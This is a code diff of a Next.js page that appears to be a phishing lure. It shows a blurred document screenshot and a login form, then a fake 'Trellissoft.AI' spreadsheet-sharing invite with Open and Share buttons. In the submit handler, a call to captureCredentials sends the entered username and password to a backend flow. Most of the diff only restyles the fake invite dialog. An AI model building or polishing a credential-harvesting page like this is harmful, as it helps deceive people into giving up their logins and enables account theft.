@@ -4,17 +4,13 @@ import { captureCredentials } from '@/ai/flows/capture-credentials';
 import {
   AlertDialog,
   AlertDialogContent,
-  AlertDialogHeader,
-  AlertDialogTitle,
-  AlertDialogDescription,
   AlertDialogFooter,
   AlertDialogAction,
 } from '@/components/ui/alert-dialog';
-import Image from 'next/image';
 
 const SpreadsheetInvite = () => {
   return (
-    <div className="container">
+    <div className="spreadsheet-invite-container">
       <div className="logo">
         <img
           src="https://dummyimage.com/150x40/00b3b3/ffffff&text=Trellissoft.AI"
@@ -61,16 +57,96 @@ export default function Home() {
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
-
-    // Capture credentials on the backend
     await captureCredentials({ username, password });
-
-    // Show the invite page
     setIsSignedIn(true);
   };
 
   return (
     <>
+      <style jsx global>{`
+        .spreadsheet-invite-container {
+          background-color: #2b2b2b;
+          border: 1px solid #3a3a3a;
+          border-radius: 8px;
+          width: 480px;
+          padding: 30px;
+          text-align: center;
+          box-shadow: 0 0 15px rgba(0,0,0,0.3);
+          color: #e0e0e0;
+        }
+        .spreadsheet-invite-container .logo {
+          margin-bottom: 10px;
+        }
+        .spreadsheet-invite-container .logo img {
+          height: 40px;
+        }
+        .spreadsheet-invite-container h2 {
+          font-size: 18px;
+          margin: 15px 0;
+          color: #ffffff;
+        }
+        .spreadsheet-invite-container p {
+          font-size: 14px;
+          color: #cccccc;
+        }
+        .spreadsheet-invite-container .file-box {
+          background-color: #1a1a1a;
+          border: 1px solid #444;
+          border-radius: 6px;
+          padding: 10px;
+          margin: 20px 0;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-weight: 500;
+        }
+        .spreadsheet-invite-container .file-box span {
+          color: #f1c40f;
+          margin-right: 5px;
+        }
+        .spreadsheet-invite-container .note {
+          font-size: 12px;
+          color: #b5b5b5;
+          margin-bottom: 20px;
+        }
+        .spreadsheet-invite-container .btn, .alert-dialog-footer .btn {
+          background-color: #0078d7;
+          color: white;
+          border: none;
+          padding: 10px 24px;
+          border-radius: 4px;
+          cursor: pointer;
+          font-size: 14px;
+          margin: 5px;
+          transition: background 0.3s;
+        }
+        .spreadsheet-invite-container .btn:hover, .alert-dialog-footer .btn:hover {
+          background-color: #005fa3;
+        }
+        .spreadsheet-invite-container footer {
+          border-top: 1px solid #333;
+          margin-top: 25px;
+          padding-top: 10px;
+          font-size: 11px;
+          color: #888;
+        }
+        .spreadsheet-invite-container .footer-logo {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          margin-bottom: 5px;
+        }
+        .spreadsheet-invite-container .footer-logo img {
+          height: 18px;
+          margin-right: 6px;
+        }
+        .alert-dialog-content {
+           background-color: #2b2b2b !important;
+           border: 1px solid #3a3a3a !important;
+           max-width: fit-content !important;
+        }
+      `}</style>
+
       {/* Blurred Image */}
       <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />
 
@@ -106,9 +182,9 @@ export default function Home() {
       </div>
 
       <AlertDialog open={isSignedIn} onOpenChange={setIsSignedIn}>
-        <AlertDialogContent className="container !max-w-none bg-[#2b2b2b] border-[#3a3a3a]">
+        <AlertDialogContent className="alert-dialog-content">
           <SpreadsheetInvite />
-          <AlertDialogFooter>
+          <AlertDialogFooter className="alert-dialog-footer sm:justify-center">
             <AlertDialogAction className="btn">Open</AlertDialogAction>
             <AlertDialogAction className="btn">Share</AlertDialogAction>
           </AlertDialogFooter>
